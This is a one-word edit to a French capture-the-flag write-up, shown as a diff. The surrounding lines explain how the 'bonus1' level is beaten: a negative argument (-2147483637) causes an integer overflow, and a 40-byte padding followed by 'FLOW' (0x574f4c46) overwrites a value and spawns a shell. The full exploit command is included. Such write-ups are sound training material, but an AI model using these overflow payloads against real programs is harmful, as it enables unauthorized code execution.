@@ -49,7 +49,7 @@ Donc là 2 possibilités s'offrent à nous:
 
 -On peut prendre -2147483637 pour réecrire la valeur passée en av[1].
 Si on réecrit et on inscrit 0x574f4c46 (qui donne FLOW)
-à la fin du payload, on passe la condition et on lance un shell.
+à la fin de l'offset, on passe la condition et on lance un shell.
 
 ./bonus1 -2147483637 $(python -c 'print "A"*40+"FLOW"')
 
